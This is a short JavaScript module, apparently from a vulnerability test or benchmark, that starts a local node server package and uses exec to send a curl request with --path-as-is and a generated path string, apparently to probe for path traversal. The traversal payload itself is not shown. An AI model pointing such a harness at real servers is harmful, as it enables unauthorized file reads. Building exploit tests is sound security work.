function exploitFunction(payload) {
  const { genstr } = payload;

  // Start the server
  const server = "node ./node_modules/serverabc/index.js";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    // Generate the attack string
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
        return;
      }

      // No need for an expect assertion here
    });
  });
}

module.exports = { exploitFunction };